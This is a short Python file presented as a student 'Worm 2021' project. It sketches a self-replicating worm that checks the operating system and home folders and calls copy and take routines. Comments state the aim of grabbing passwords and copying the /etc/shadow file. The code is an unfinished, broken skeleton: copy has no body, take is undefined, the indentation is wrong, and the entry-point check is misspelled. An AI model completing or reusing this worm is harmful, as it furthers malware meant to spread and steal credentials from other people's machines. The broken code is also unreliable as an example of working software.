#The Beginning

# Worm 2021 Project By Mia Jenkins and Mentored by Deep Ramanayake

#import modules
import sys #allows for command line and creating files 
import os #allows us access for command line as well but more clear
import glob #helps with replication process and path finding 
import nmap #should allow me to pull from the nmap; may not use
import socket #should allow me to pull the ip address of the host machine of the virus
import platform #gives me system info

def wiggle():
    #the purpose of this function is to allow the worm to move and find files

    #first check the OS
    system = platform.system()

    #the computer is linux 
    if(system == "Linux"):
        #get the current location
        currentpath = os.path.abspath("worm.py")

        #need the username to properly get pathway names
        username = os.getlogin()

        #if the worm is in downloads
        if(os.path.isdir("/home/"+username+"/Downloads/")):
            copy()
            take()
            #should I send it to another location
        #if the worm is in Documents
         if(os.path.isdir("/home/"+username+"/Documents/")):
            copy()
            take()
        
        #if its not in any of those two locations this person is weird grab me the passwords
        else:
            #send the worm to the /etc and copy the shadow file but that may need addditional permissions
            #for right now just take whatever
            copy()
            take()

def copy():
    #going to copy the worm to the file 

def main():
    wiggle()
    copy()
    take()

if __name__=="_main_":
    main()

# The End 